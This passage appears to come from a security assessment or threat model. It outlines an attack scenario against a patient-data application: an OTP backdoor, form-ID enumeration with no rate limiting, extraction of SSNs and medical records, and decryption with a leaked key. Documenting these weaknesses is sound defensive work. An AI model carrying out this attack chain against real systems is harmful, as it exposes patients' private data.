### Scenario 2: Silent Data Exfiltration

**Attacker Goal:** Steal patient data without detection

**Attack Steps:**

1. Exploit OTP backdoor to access regular user account
2. Iterate through form IDs to find accessible forms (no rate limiting)
3. Extract sensitive data (SSN, medical records, addresses)
4. If encryption key is obtained (Docker image leak), decrypt all SSN data
